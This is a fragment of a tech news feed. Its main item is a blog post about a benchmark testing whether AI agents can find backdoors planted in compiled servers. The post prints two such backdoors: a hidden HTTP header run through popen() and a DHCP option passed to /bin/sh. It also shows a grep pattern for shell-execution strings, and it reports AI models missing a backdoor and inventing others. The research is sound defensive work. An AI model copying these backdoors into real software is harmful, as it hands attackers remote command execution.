      "content_text": "Super Early Bird pricing for TechCrunch Disrupt 2026 ends February 27 at 11:59 p.m. PT. That means you have just 6 days left to secure the lowest ticket prices of the year. If Disrupt has been on your must-attend list, this is your moment. Save up to $680 on your individual pass or secure up to 30% off with community passes before prices increase. Register here. From October 13-15 at San Francisco’s Moscone West, TechCrunch will bring together 10,000 founders, investors, operators, and innovators for three focused days built around launching, scaling, and shaping what’s next in tech. What’s at Disrupt? Disrupt is where you get: Direct access to founders, VCs, and operators actively building. Conversations that turn into funding, partnerships, and key hires. Tactical insights you can apply immediately. Early visibility into where tech is heading next. Image Credits: Slava Blazer Photograpy You’ll see 300+ exhibiting startups debut tomorrow’s breakthroughs, experience the high-stakes Startup Battlefield 200 pitch competition — where one standout company wins a $100,000 equity-free prize — and take part in curated networking designed to drive real outcomes. You’ll also hear insights from some of the most influential voices in tech, including WordPress co-founder Matt Mullenweg , General Motors CEO Mary Barra , and legendary VC Vinod Khosla . Keep an eye on the event page for the agenda drop. Maximize your experience as a founder or investor Founder Pass : Built to help you scale faster with the right insights and connections Investor Pass : Designed to help you discover breakout startups and expand your portfolio Secure your pass before rates increase Six days remain to secure the lowest rate of the year. Lock it in before February 27 at 11:59 p.m. PT. Register here . Techcrunch event Boston, MA | June 9, 2026 Image Credits: TechCrunch",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/10/Disrupt-2025-day-3.jpg?resize=1200,800"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "We hid backdoors in ~40MB binaries and asked AI + Ghidra to find them",
      "url": "https://quesma.com/blog/introducing-binaryaudit/",
      "published": "2026-02-22T14:50:44+00:00",
      "summary": "<p>Article URL: <a href=\"https://quesma.com/blog/introducing-binaryaudit/\">https://quesma.com/blog/introducing-binaryaudit/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47111440\">https://news.ycombinator.com/item?id=47111440</a></p> <p>Points: 14</p> <p># Comments: 2</p>",
      "content_text": "Claude can code, but can it check binary executables? We already did our experiments with using NSA software to hack a classic Atari game . This time we want to focus on a much more practical task — using AI agents for malware detection . We partnered with Michał “Redford” Kowalczyk, reverse engineering expert from Dragon Sector, known for finding malicious code in Polish trains , to create a benchmark of finding backdoors in binary executables, without access to source code. See BinaryAudit for the full benchmark results — including false positive rates, tool proficiency, and the Pareto frontier of cost-effectiveness. All tasks are open source and available at quesmaOrg/BinaryAudit . We were surprised that today’s AI agents can detect some hidden backdoors in binaries. We hadn’t expected them to possess such specialized reverse engineering capabilities. However, this approach is not ready for production. Even the best model, Claude Opus 4.6, found relatively obvious backdoors in small/mid-size binaries only 49% of the time. Worse yet, most models had a high false positive rate — flagging clean binaries. In this blog post we discuss a few recent security stories, explain what binary analysis is, and how we construct a benchmark for AI agents. We will see when they accomplish tasks and when they fail — by missing malicious code or by reporting false findings. Background Just a few months ago Shai Hulud 2.0 compromised thousands of organizations, including Fortune 500 companies, banks, governments, and cool startups — see postmortem by PostHog . It was a supply chain attack for the Node Package Manager ecosystem, injecting malicious code stealing credentials. Just a few days ago, Notepad++ shared updates on a hijack by state-sponsored actors , who replaced legitimate binaries with infected ones. Even the physical world is at stake, including critical infrastructure. For example, researchers found hidden radios in Chinese solar power inverters and security loopholes in electric buses . Every digital device has a firmware, which is much harder to check than software we install on the computer — and has much more direct impact. Both state and corporate actors have incentive to tamper with these. Michał “Redford” Kowalczyk from Dragon Sector on reverse engineering a train to analyze a suspicious malfunction , the most popular talk at the 37th Chaos Communication Congress . See also Dieselgate, but for trains writeup and a subsequent discussion . You do not even need bad actors. Network routers often have hidden admin passwords baked into their firmware so the vendor can troubleshoot remotely — but anyone who discovers those passwords gets the same access. Can we use AI agents to protect against such attacks? Binary analysis In day-to-day programming, we work with source code. It relies on high-level abstractions: classes, functions, types, organized into a clear file structure. LLMs excel here because they are trained on this human-readable logic. Malware analysis forces us into a harder world: binary executables. Compilation translates high-level languages (like Go or Rust) into low-level machine code for a given CPU architecture (such as x86 or ARM). We get raw CPU instructions: moving data between registers, adding numbers, or jumping to memory addresses. The original code structure, together with variables and functions names gets lost. To make matters worse, compilers aggressively optimize for speed, not readability. They inline functions (changing the call hierarchy), unroll loops (replacing concise logic with repetitive blocks), and reorder instructions to keep the processor busy. Yet, a binary is what users actually run. And for closed-source and binary-distributed software, it is all we have. Analyzing binaries is a long and tedious process of reverse engineering, which starts with a chain of translations: machine code → assembly → pseudo-C . Let’s see how an example backdoor looks in those representations: 1 Raw Binary xxd ↓ hover/tap code to trace b9 01 00 00 00 48 89 df ba e0 00 00 00 e8 b6 c6 ff ff 49 89 c5 48 85 c0 74 6e 44 0f b6 40 01 4c 8d 8c 24 a0 01 00 00 49 8d 75 02 4c 89 cf 4c 89 c0 41 83 f8 08 72 0a 4c 89 c1 48 c1 e9 03 f3 48 a5 31 d2 41 f6 c0 04 74 09 8b 16 89 17 ba 04 00 00 00 41 f6 c0 02 74 0c 0f b7 0c 16 66 89 0c 17 48 83 c2 02 41 83 e0 01 74 07 0f b6 0c 16 88 0c 17 4c 89 cf c6 84 04 a0 01 00 00 00 e8 b7 4c fd ff 2 Disassembly objdump ↓ hover/tap code to trace 33e88: mov ecx, 0x1 33e8d: mov rdi, rbx 33e90: mov edx, 0xe0 33e95: call 30550 33e9a: mov r13, rax 33e9d: test rax, rax 33ea0: je 33f10 33ea2: movzx r8d, BYTE PTR [rax+1] 33ea7: lea r9, [rsp+0x1a0] 33eaf: lea rsi, [r13+0x2] ... (omitted for brevity) 33efc: mov BYTE PTR [rsp+rax+0x1a0], 0x0 33f04: call system@plt 3 Decompiled Ghidra ↓ hover/tap code to trace lVar18 = FUN_00130550 (pcVar41, param_4, 0xe0 , 1 ); if ( lVar18 != 0 ) { bVar49 = *(byte *)(lVar18 + 1) ; puVar26 = (undefined8 *)(lVar18 + 2) ; pcVar20 = (char *)&local_148 ; if (7 < bVar49) { for (uVar44 = (ulong)(bVar49 >> 3); uVar44 != 0; uVar44--) { *(undefined8 *)pcVar20 = *puVar26; puVar26++; pcVar20 += 8; } } *(undefined1 *)((long)&local_148 + (ulong)bVar49) = 0 ; system((char *)&local_148) ; } Going from raw bytes to assembly is straightforward, as it can be viewed with a command-line tool like objdump . Turning assembly into C is much harder — we need reverse engineering tools, such as open-source Ghidra (created by NSA) and Radare2 , or commercial ones like IDA Pro and Binary Ninja . The decompilers try their best at making sense of the CPU instructions and generating a readable C code. But since all those high-level abstractions and variable names got lost during compilation, the output is far from perfect. You see output full of FUN_00130550 , bVar49 , local_148 — names that mean nothing. The benchmark Tasks We ask AI agents to analyze binaries and determine if they contain backdoors or malicious modifications. Source code Open source project + injected backdoor Binary Stripped executable no symbols, no source AI agent + objdump, nm, ... Has a backdoor? YES 0x4a1c30 or NO We started with several open-source projects: lighttpd (a C web server), dnsmasq (a C DNS/DHCP server), Dropbear (a C SSH server), and Sozu (a Rust load balancer). Then, we manually injected backdoors. For example, we hid a mechanism for an attacker to execute commands via an undocumented HTTP header. Important caveat : All backdoors in this benchmark are artificially injected for testing. We do not claim these projects have real vulnerabilities; they are legitimate open-source software that we modified in controlled ways. These backdoors weren’t particularly sophisticated — we didn’t try to heavily obfuscate them or hide them in obscure parts of the code. They are the kind of anomaly a skilled human reverse engineer could spot relatively easily. The agents are given a compiled executable — without source code or debug symbols. They have access to reverse engineering tools: Ghidra , Radare2 , and binutils . The task is to identify malicious code and pinpoint the start address of the function containing the backdoor (e.g., 0x4a1c30 ). See dnsmasq-backdoor-detect-printf/instruction.md for a typical instruction. A few tasks use a different methodology: we present three binaries and ask which ones contain backdoors, without asking for the specific location – see e.g. sozu-backdoor-multiple-binaries-detect/instruction.md . We expected this to be a simpler task (it wasn’t). This approach simulates supply chain attacks, where often only a subset of binaries are altered. An example when it works Backdoor in an HTTP server We injected a backdoor into the lighttpd server that executes shell commands from an undocumented HTTP header. Here’s the core of the injected backdoor — it looks for a hidden X-Forwarded-Debug header, executes its contents as a shell command via popen() , and returns the output in a response header: gboolean li_check_debug_header (liConnection * con ) { liRequest * req = & con->mainvr->request; GList * l; l = li_http_header_find_first (req->headers, CONST_STR_LEN ( \"X-Forwarded-Debug\" )); if ( NULL != l) { liHttpHeader * hh = (liHttpHeader * ) l->data; char * debugIn = LI_HEADER_VALUE (hh); FILE * fp = popen (debugIn, \"r\" ); // Execute attacker's command // ... read output into debugOut ... pclose (fp); li_http_header_insert (con->mainvr->response.headers, CONST_STR_LEN ( \"X-Request-Trace\" ), debugOut, strlen (debugOut)); } return TRUE ; } For a user who downloaded this backdoored server, it would seem like this is a legitimate program. However, an attacker could trivially execute any command by sending a specially crafted packet. Claude Opus 4.5 found the backdoor within 5 minutes Here’s how Claude did it: Step 1. The model identified the binary and its 26 shared libraries — one of which contained the backdoor. Step 2. Next, it ran strings with grep patterns looking for obvious indicators of a backdoor: strings bin/lighttpd2-worker | grep -iE '(shell|bash|/bin/sh|exec|system|backdoor)' However, the command didn’t find anything suspicious. The model expanded the search to all shared libraries, looking for more patterns (hardcoded IPs, suspicious commands, and credential patterns). Still nothing obvious. Step 3. Claude switched strategies and used nm -D to list imported functions: for f in lib/*.so ; do nm -D \" $f \" | grep -E ' U (system|exec|popen)' done This revealed something interesting: lib/liblighttpd2-shared-2.0.0.so: U popen@GLIBC_2.2.5 Claude detected that one of the libraries that the server uses imports popen() : function used to execute shell commands. It immediately alarmed the model: Anthropic Claude Opus 4.5: The liblighttpd2-shared.so uses popen() . This could be legitimate (for spawning worker processes) or could be a backdoor. I need to investigate what these functions are used for by decompiling the code. Step 4. Claude investigated further to determine if the function was truly malicious, using the Radare2 decompiler for analysis. It first identified which function calls popen() : r2 -q -c 'aaa; axt @ sym.imp.popen' lib/liblighttpd2-shared-2.0.0.so The output of this command revealed that a function called li_check_debug_header does shell execution. (That’s the backdoor we added!). The model smelled something fishy: Anthropic Claude Opus 4.5: This is very suspicious! A “debug header” function calling popen is a classic backdoor pattern — it could be checking for a special HTTP header and executing commands based on it. Then using Radare2’s decompiler, the model examined the function: r2 -q -c 'aaa; s dbg.li_check_debug_header; pdc' lib/liblighttpd2-shared-2.0.0.so The decompiled pseudocode allowed the LLM to understand how the backdoor works — it looks for an undocumented HTTP header X-Forwarded-Debug and if it’s present executes an attacker-provided command. The server conveniently sends the command output back in a X-Request-Trace response header. Step 5. Finally, Claude used Radare2 to confirm the function wasn’t dead code, checking cross-references to ensure it was called from the main program: r2 -q -c 'aaa; s 0x00015260; pd 10' lib/liblighttpd2-shared-2.0.0.so Now being confident that it found a real backdoor, Claude reported those findings back and finished the exploration. When it fails: rationalizing away an obvious backdoor DHCP backdoor However, LLMs very often miss even obvious backdoors. We took dnsmasq — a widely-used DNS/DHCP server — and added an embarrassingly obvious backdoor. We weren’t even trying to hide it: if DHCP option 224 (undocumented, we made it up) is present in a packet, execute its contents as a shell command via execl(\"/bin/sh\", \"sh\", \"-c\", buf, NULL) . The backdoor we added was just 7 lines of C in DHCP packet parsing: /* existing DHCP option handling */ match_vendor_opts (opt, daemon -> dhcp_opts ); + if (opt = option_find (mess, sz, 224 , 1 )) { + char buf [ 256 ]; + int len = option_len (opt); + memcpy (buf, option_ptr (opt, 0 ), len); + buf [len] = ' \\0 ' ; + execl ( \"/bin/sh\" , \"sh\" , \"-c\" , buf, NULL ); + } Claude Opus 4.6 found it… and persuaded itself there is nothing to worry about Even the best model in our benchmark got fooled by this task. Claude Opus 4.6 found /bin/sh in the strings output early on, traced it to the exact function containing the backdoor, and saw the execl(\"/bin/sh\", \"sh\", \"-c\", ...) call. Then it simply assumed it was normal: Anthropic Claude Opus 4.6: I can see the /bin/sh usage at 0x42e9df — it’s calling execl(\"/bin/sh\", \"sh\", \"-c\", r13, NULL) . This is a pattern for executing a shell command, which could be legitimate in dnsmasq (e.g., for DHCP script execution). It examined the function, but concluded: Anthropic Claude Opus 4.6: The execl(\"/bin/sh\", \"sh\", \"-c\", ...) pattern is typical of dnsmasq’s DHCP lease script execution. This is likely the legitimate lease_helper/script execution function. The model found the exact function, saw the exact execl call with /bin/sh -c — and rationalized it away as “legitimate DHCP script execution.” It never checked where the command string actually comes from (a DHCP packet from client). It then moved on to investigate other functions and never circled back. The needle-in-haystack problem The executables in our benchmark often have hundreds or thousands of functions — while the backdoors are tiny, often just a dozen lines buried deep within. Finding them requires strategic thinking: identifying critical paths like network parsers or user input handlers and ignoring the noise. Current LLMs lack this high-level intuition. Instead of prioritizing high-risk areas, they often decompile random functions or grep for obvious keywords like system() or exec() . When simple heuristics fail, models frequently hallucinate or give up entirely. This lack of focus leads them down rabbit holes. We observed agents fixating on legitimate libraries — treating them as suspicious anomalies. They wasted their entire context window auditing benign code while the actual backdoor remained untouched in a completely different part of the binary. Limitations False positives The security community is drowning in AI-generated noise. The curl project recently stopped paying for bug reports partly because of AI slop: The vast majority of AI-generated error reports submitted to cURL are pure nonsense. A security tool which gives you fake reports is useless and frustrating to use. We specifically tested for this with negative tasks — clean binaries with no backdoor. We found that 28% of the time models reported backdoors or issues that weren’t real. For any practical malware detection software, we expect a false positive rate of less than 0.001%, as most software is safe, vide false positive paradox . False positive rate measures how often models incorrectly report backdoors in clean binaries. Lower is better. See also detection vs false alarms combining it with pass rate. For example, Gemini 3 Pro supposedly “discovered” a backdoor in… command-line argument parsing in one of the servers: Google Gemini 3 Pro: I have confirmed that the max-cache-ttl option (index 312, 0x138 ) is handled by code that treats its argument as a string and stores it at offset 0x138 of the global configuration structure. This is highly suspicious for a TTL option which should be an integer. Furthermore, the function fcn.0002b260 reads the string from offset 0x138 , appends ” ini” to it, and executes it using popen . The output is then parsed for a “duid”. This behavior allows an attacker to execute arbitrary commands by passing them as the argument to the --max-cache-ttl option (e.g., --max-cache-ttl=/bin/sh ). This is a clear backdoor disguised as a legitimate configuration option. In reality, the source code correctly validates and parses the command-line argument as a number. It never attempts to execute it. Several “findings” that the model reported are completely fake and missing from the source code. W",
      "cover_image_url": "https://quesma.com/_astro/overall_ranking.CRL7hnOy.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Man accidentally gains control of 7,000 robot vacuums",
      "url": "https://www.popsci.com/technology/robot-vacuum-army/",
      "published": "2026-02-22T14:44:42+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.popsci.com/technology/robot-vacuum-army/\">https://www.popsci.com/technology/robot-vacuum-army/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47111400\">https://news.ycombinator.com/item?id=47111400</a></p> <p>Points: 16</p> <p># Comments: 1</p>",
      "content_text": "Get the Popular Science daily newsletter💡 Breakthroughs, discoveries, and DIY tips sent six days a week. A software engineer’s earnest effort to steer his new DJI robot vacuum with a video game controller inadvertently granted him a sneak peak into thousands of people’s homes. While building his own remote-control app, Sammy Azdoufal reportedly used an AI coding assistant to help reverse-engineer how the robot communicated with DJI’s remote cloud servers. But he soon discovered that the same credentials that allowed him to see and control his own device also provided access to live camera feeds, microphone audio, maps, and status data from nearly 7,000 other vacuums across 24 countries. The backend security bug effectively exposed an army of internet-connected robots that, in the wrong hands, could have turned into surveillance tools, all without their owners ever knowing. The DJI Romo. Image: DJI Luckily, Azdoufal chose not to exploit that. Instead, he shared his findings with The Verge , which quickly contacted DJI to report the flaw. While DJI tells Popular Science the issue has been “resolved,” the dramatic episode underscores warnings from cybersecurity experts who have long-warned that internet-connected robots and other smart home devices present attractive targets for hackers . As more households adopt home robots, (including newer, more interactive humanoid models ) similar vulnerabilities could become harder to detect. AI-powered coding tools, which make it easier for people with less technical knowledge to exploit software flaws, potentially risk amplifying those worries even further. Stumbling into a massive security hole The robot in question is the DJI Romo , an autonomous home vacuum that first launched in China last year and is currently expanding to other countries. It retails for around $2,000 and is roughly the size of a large terrier or a small fridge when docked at its base station. Like other robot vacuums, it’s equipped with a range of sensors that help it navigate its surroundings and detect obstacles. Users can schedule and control it via an app, but it is designed to spend most of its time cleaning and mopping autonomously. In order for the Romo, or really any modern autonomous vacuum, to function it needs to constantly collect visual data from the building it is operating in. It also needs to understand specific details about what makes, say, a kitchen different from a bedroom, so it can distinguish between the two. Some of that sensor data is stored remotely on DJI’s servers rather than on the device itself. For Azdoufal’s DIY controller idea to work, he would need a way for his app to communicate with DJI’s servers and extract a security token that proves he is the owner of the robot. Rather than just verifying a single token, the servers granted access for a small army of robots, essentially treating him as their respective owner. That slip-up meant Azdoufal could tap into their real-time camera feeds and activate their microphones. He also claims he could compile 2D floor plans of the homes the robots were operating in. A quick look at the robots’ IP addresses also revealed their approximate locations. None of this, Azdoufal insists, amounts to “hacking” on his part. He simply stumbled upon a major security issue. “DJI identified a vulnerability affecting DJI Home through internal review in late January and initiated remediation immediately,” DJI told Popular Science. “The issue was addressed through two updates, with an initial patch deployed on February 8 and a follow-up update completed on February 10. The fix was deployed automatically, and no user action is required.” The company went on to say its plans to “continue to implement additional security enhancements” but did not specify what those may entail. Related: [ The best robot vacuums ] Home owners are grappling with the privacy cost of smart homes The DJI security concerns come amid a period of growing unease generally about the surveillance capabilities of smart home technology. Earlier this month, Ring camera owners flooded social media after a controversial advertisement for the company’s pet-finding “search party” feature was interpreted by some as a Trojan horse for broader monitoring. Around the same time, reports that Google was able to retrieve video footage from a Nest Doorbell camera to assist in an abduction investigation (despite earlier indications that the footage had been deleted) reignited debate over how much control consumers truly have over their sensitive data. On top of that, lawmakers from both political parties in the US have spent years warning that DJI and other Chinese tech manufacturers pose a unique security threat . The evidence for those claims are murky, it’s nonetheless helped justify the banning of certain Chinese-made products . The irony of many robot vacuums and other smart home devices is that, as a category, they have a long history of questionable security practices, despite the fact that they operate in some of our most private spaces. All signs suggest that the average person will soon welcome more cameras and microphones into their homes, not fewer. As of 2020, market research firm Parks Associates estimates that 54 million U.S. households had at least one smart home device installed. Other surveys show that those who already have one often want more. The specific types of devices entering homes are also becoming more sophisticated. Though still early, Tesla , Figure , and other companies are racing to build human-like autonomous robots that can live in a home and perform chores . A company called 1X is already retailing one of these humanoids, claiming it can clean dishes and crack walnuts —albeit often with some help from a human. Eventually though, for any of these at-home robot servants to function effectively, they will need unprecedented access to the intimate details of their owners’ homes. For a stalker or hacker, that represents a potential goldmine. True to his word though, Azdoufal found himself wrapped up in this mess even though all he wanted to do was drive his robot around with a joystick. On that front, mission accomplished . Controlling DJI Romo vacuum with a ps5 controller VIDEO 2025 PopSci Best of What’s New The 50 most important innovations of the year",
      "cover_image_url": "https://www.popsci.com/wp-content/uploads/2026/02/robot_army.jpg?quality=85&w=1200"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "This magazine plays Tetris - here’s how",
      "url": "https://www.theverge.com/tech/881175/red-bull-media-house-game-pop-bulletin-magazine-playable-tetris-flexible-display",
      "published": "2026-02-22T14:03:24+00:00",
      "summary": "Tetris has been immortalized in a playable McDonald's plastic chicken nugget, a playable fake 7-Eleven Slurpee cup, and a playable wristwatch. But the most intriguing way to play Tetris yet is encased in paper. Last year the Tetris Company partnered with Red Bull for a gaming tournament that culminated in the 150-meter-tall Dubai Frame landmark [&#8230;]",
      "content_text": "Tetris has been immortalized in a playable McDonald’s plastic chicken nugget , a playable fake 7-Eleven Slurpee cup , and a playable wristwatch . But the most intriguing way to play Tetris yet is encased in paper. Last year the Tetris Company partnered with Red Bull for a gaming tournament that culminated in the 150-meter-tall Dubai Frame landmark being turned into the world’s largest playable Tetris installation using over 2,000 drones that functioned as pixels . Although the timing was a coincidence, Red Bull also published a 180-page gaming edition of its The Red Bulletin lifestyle magazine around the same time as the event, with a limited number of copies wrapped in a less grandiose, but no less technically impressive, version of Alexey Pajitnov’s iconic puzzle game. To create a playable gaming magazine, Red Bull Media House (the company’s media wing) enlisted the help of Kevin Bates, who in 2014 wowed the internet by creating an ultra-thin Tetris -playing business card . In 2015, he launched the $39 Arduboy , a credit card-sized, open-source handheld that attracted a thriving community of developers . Over the course of a decade, Bates also created a pair of equally pocketable Tetris -playing handhelds that cost less than $30, and the shrunken-down USB-C Arduboy Mini . The GamePop GP-1 Playable Magazine System (as it’s officially called) is the latest evolution of Bates’ mission to use existing, accessible, and affordable technologies to reimagine what a portable gaming device can be. It took “most of last year” to develop, Bates revealed during a call with The Verge . He wouldn’t divulge the exact details of how his collaboration with Red Bull came to be. But if you’re looking to make an officially licensed version of Tetris that’s thin enough to flex, Bates has the experience, and he shared with us some of the technical details that make this creation work. The game’s screen is made up of 180 tiny RGB LEDs on a custom circuit board that can flex and bend. While OLED display technology has given us tablet-sized devices that fold into smartphones , they’re still expensive and fragile. To make a display that can survive being embedded in a flexible magazine cover without reinforcement, Bates created a custom matrix of 180 2mm RGB LEDs mounted to a flexible circuit board just 0.1mm thick. While the display and coin-cell batteries make it thicker in a few places — nearly 5mm at its thickest point — you genuinely feel like you’re playing a handheld made of paper. The flexible circuits are bonded between two sheets of paper to create the sleeve that wraps around the book-sized magazine, and it feels satisfyingly thin and flexible. Flexible circuits aren’t a new idea. They’ve been used in electronics for decades. You can find them in flip phones old enough they now feel like antiques , and nearly every laptop. They’re also frequently used to miniaturize devices that don’t fold or flex at all, connecting internal components where space is extremely limited. But it’s only in the past five or six years that the technology has become available to smaller makers, and Bates says he’s been “messing around with the flexible circuits for about as much time.” This collaboration was an opportunity to use what he’s learned to create a device that would live outside his workshop. The GamePop GP-1’s display resolution pales in comparison to the OLED screens used in folding phones, but Bates’ creation is far more durable. The game has not only undergone the typical safety tests, but Bates even “hit it with a hammer a few times” to test its durability. His display survived, but don’t try that with a folding phone. They’re still far less durable . To keep it as thin as possible, the Tetris game uses embedded touch sensors instead of physical buttons. Instead of buttons, the game uses seven capacitive touch sensors that are directly “printed in the copper layer of the board,” Bates says. There’s no true mechanical feedback when pressed, but the paper’s flex helps them feel a bit like a button when you press down. Bates says the responsiveness of the sensors was specifically tuned to account for the thickness of the paper stock and the glues used in the final print run. You’re not going to be chasing Tetris world records on the cover of a magazine, but the controls are satisfyingly responsive and the game is surprisingly much easier to play than other Tetris devices I’ve tested. Most of the game is made using flexible electronics, but there is a thin rigid PCB housing its processor and rechargeable batteries. How much does a flexible Tetris game cost to manufacture? Neither Bates nor Red Bull would divulge the total price tag for all the off-the-shelf and custom components you’ll find sandwiched inside the magazine’s cover. But to help keep costs down, not all components are flexible. Inside the edge of the cover, next to the magazine’s spine, you’ll find a long but thin rigid PCB where an ARM-based 32-bit microprocessor is located, along with four rechargeable LIR2016 3V coin cell batteries. The magazine features a deconstructed USB-C charging port along the bottom edge of its cover. Like most devices now, the game can be recharged using a USB-C cable, but it’s not immediately obvious where. Hidden along the bottom edge of the magazine’s cover is a deconstructed USB-C port. Instead of a metal ring, its socket is a small paper pocket containing a pin-covered head inside. It doesn’t feel quite as durable as the charging port on your phone, but it’s a welcome alternative to making the game disposable when the batteries die. Bates did have to cut some corners. The GamePop GP-1 saves high scores, but modern Tetris gameplay features, like previews of upcoming pieces and being able to save tetrominoes for later, aren’t included. There’s sound effects, but when starting a game you only hear a small snippet of the iconic Tetris theme. The game’s piezo speaker “uses about as much energy as it does to run the rest of the system,” Bates says, so this helps prolong the life of the small rechargeable batteries. He tells us you can play for an hour or two that way, and the battery should last many months when not in use. Red Bull made around 1,000 copies of the magazine. It’s only available online in Europe , but can also be found in some stores and newsstands, including Iconic Magazines in New York and Rare Mags outside Manchester in the UK. However, only 150 copies with the playable cover were produced, and none were made available to the public. They were distributed to Tetris competitors, those featured in the magazine, influencers, and select media. The playable cover isn’t going to revolutionize the print industry, or pave the way for smartphones we can roll up and stick in our back pockets. The goal was to use existing tech in a way that gamers haven’t seen before. Photography by Andrew Liszewski / The Verge Follow topics and authors from this story to see more like this in your personalized homepage feed and to receive email updates. Andrew Liszewski Gadgets Gaming Hands-on Reviews Tech",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/redbull_tetris2.jpg?quality=90&strip=all&crop=0%2C10.740836125969%2C100%2C78.518327748063&w=1200"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Iran students resume anti-government protests",
      "url": "https://www.bbc.com/news/articles/c5yj2kzkrj0o",
      "published": "2026-02-22T13:59:40+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.bbc.com/news/articles/c5yj2kzkrj0o\">https://www.bbc.com/news/articles/c5yj2kzkrj0o</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47111067\">https://news.ycombinator.com/item?id=47111067</a></p> <p>Points: 25</p> <p># Comments: 4</p>",
      "content_text": "The US-based Human Rights Activists News Agency (Hrana) said it had confirmed the killing of at least 7,015 people during that wave, including 6,508 protesters, 226 children and 214 people affiliated with the government. The latest figures were updated on 15 February.",
      "cover_image_url": "https://ichef.bbci.co.uk/news/1024/branded_news/a75b/live/6cc1b4f0-0fd9-11f1-b048-c9424b2cf5fd.jpg"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "I put New Zealand behind a $1 paywall",
      "url": "https://rename.world/",
      "published": "2026-02-22T13:57:18+00:00",
      "summary": "<p>Article URL: <a href=\"https://rename.world/\">https://rename.world/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47111042\">https://news.ycombinator.com/item?id=47111042</a></p> <p>Points: 22</p> <p># Comments: 4</p>",
      "content_text": "<p>Article URL: <a href=\"https://rename.world/\">https://rename.world/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47111042\">https://news.ycombinator.com/item?id=47111042</a></p> <p>Points: 22</p> <p># Comments: 4</p>",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "volatilityfoundation/volatility3: Volatility 3.0 development",
      "url": "https://github.com/volatilityfoundation/volatility3",
      "published": "2026-02-22T13:20:07+00:00",
      "summary": "<p>Article URL: <a href=\"https://github.com/volatilityfoundation/volatility3\">https://github.com/volatilityfoundation/volatility3</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47110781\">https://news.ycombinator.com/item?id=47110781</a></p> <p>Points: 14</p> <p># Comments: 0</p>",
      "content_text": "volatilityfoundation/volatility3 You can’t perform that action at this time.",
      "cover_image_url": "https://opengraph.githubassets.com/2e95572a7a62e934bc9e65a9285976eaeecb10c2141c86df4c665b08a2e64584/volatilityfoundation/volatility3"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "America desperately needs new privacy laws",
      "url": "https://www.theverge.com/column/882516/privacy-laws-america",
      "published": "2026-02-22T13:00:00+00:00",
      "summary": "This is The Stepback, a weekly newsletter breaking down one essential story from the tech world. For more on the dire state of tech regulation, follow Adi Robertson. The Stepback arrives in our subscribers' inboxes at 8AM ET. Opt in for The Stepback here. How it started In 1973, long before the modern digital era, [&#8230;]",
      "content_text": "This is The Stepback , a weekly newsletter breaking down one essential story from the tech world. For more on the dire state of tech regulation, follow Adi Robertson . The Stepback arrives in our subscribers’ inboxes at 8AM ET. Opt in for The Stepback here . In 1973, long before the modern digital era, the US Department of Health, Education, and Welfare (HEW) published a report called “Records, Computers, and the Rights of Citizens.” Networked computers seemed “destined to become the principal medium for making, storing, and using records about people,” the report’s foreword began . These systems could be a “powerful management tool.” But with few legal safeguards, they could erode the basic human right to privacy — particularly “control by an individual over the uses made of information about him.” These concerns weren’t just cheap talk in Washington. In 1974, Congress passed the Privacy Act, which set some of the first rules aimed at computerized records systems — limiting when government agencies could share information and outlining what access individuals should have. Over the course of the 20th century, the Privacy Act was joined by more privacy rules for fields including healthcare , websites for children , electronic communications , and even video cassette rentals . But over the past couple of decades, amid an explosion in digital surveillance by governments and private companies, Congress has repeatedly failed to keep up. Lawmakers have weighed numerous plans for preserving Americans’ privacy, yet over and over, they’ve fizzled. Attempts to rein in government spying — like proposed updates to the Electronic Communications Privacy Act of 1986 — have been sandbagged by fears they’d compromise police and anti-terrorism operations. Despite multiple concerted attempts from members of both parties, Congress hasn’t passed a bill that governs how private companies collect data and what rights people have over their own information. Even highly targeted proposals like the Fourth Amendment Is Not for Sale Act — which restricts police from bypassing existing privacy laws by using data brokers — haven’t cleared the hurdle of becoming law. Meanwhile, new technologies, from augmented reality glasses to generative artificial intelligence, create fresh risks every day — making it easier than ever to surreptitiously surveil people or encouraging sharing intimate information with tech platforms. Immigration agents are harassing citizens that they’ve identified with data analytics tools and facial recognition. Data breaches at major tech companies are common, and security regulations meant to prevent them are being rolled back. Amazon just aired a Super Bowl ad bragging about how your doorbell can become part of a distributed surveillance dragnet for finding dogs. At every point, invasions of privacy don’t just risk revealing something intimate about you to the world, they shift the balance of power toward whoever holds the most data. Take algorithmic pricing, where companies use personal information about shoppers to set individualized prices they estimate people will pay — resulting in companies like Instacart charging users different prices for the same item . (The company said this was an experiment it’s since ended.) State-level and international regulations have addressed some privacy risks. Companies in Europe have been governed by the General Data Protection Regulation (GDPR) since 2018 , though a rollback was proposed late last year . Several states have passed some form of general privacy framework, as well as more specific rules — Illinois’ biometric privacy law has facilitated lawsuits against Meta and others, for instance, and New York mandated algorithmic pricing disclosure a few months ago. However, privacy advocates warn many of the rules are inadequate. The Electronic Privacy Information Center (EPIC) and US PIRG Education Fund graded state consumer privacy bills in 2025, and only two states, California and Maryland, earned higher than a C. EPIC deputy director Caitriona Fitzgerald tells The Verge that Congress has passed at least one meaningful reform lately: the 2024 Protecting Americans’ Data from Foreign Adversaries Act, which Fitzgerald calls “the strongest privacy law to be passed at the federal level in recent years.” PADFAA bars data brokers from letting hostile nations access sensitive personal information of Americans, and EPIC used it to file a complaint against Google’s real-time bidding ads system — which it alleges broadcast sensitive data indiscriminately. Overall, though, it’s fair to say the situation isn’t great. As of early 2026, in many places, a sense of learned helplessness around privacy has taken hold. Companies like Meta push the line that if an existing technology already poses privacy concerns, it’s unreasonable to complain that a new technology 